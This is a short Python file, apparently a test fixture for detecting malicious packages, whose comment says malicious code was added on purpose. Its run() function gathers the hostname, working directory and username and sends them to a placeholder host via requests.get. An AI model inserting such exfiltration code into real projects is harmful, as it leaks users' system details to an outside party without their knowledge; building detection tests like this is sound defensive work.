from dotenv import load_dotenv
def main() -> None:
    print("Hello from test-project's __main__!")

# Malicious code intentionally added for testing detection
import os, socket, getpass, requests
def run():
    hostname=socket.gethostname()
    cwd = os.getcwd()
    username = getpass.getuser()
    ploads = {'hostname':hostname,'cwd':cwd,'username':username}
    requests.get("https://xxxxx.net",params = ploads)
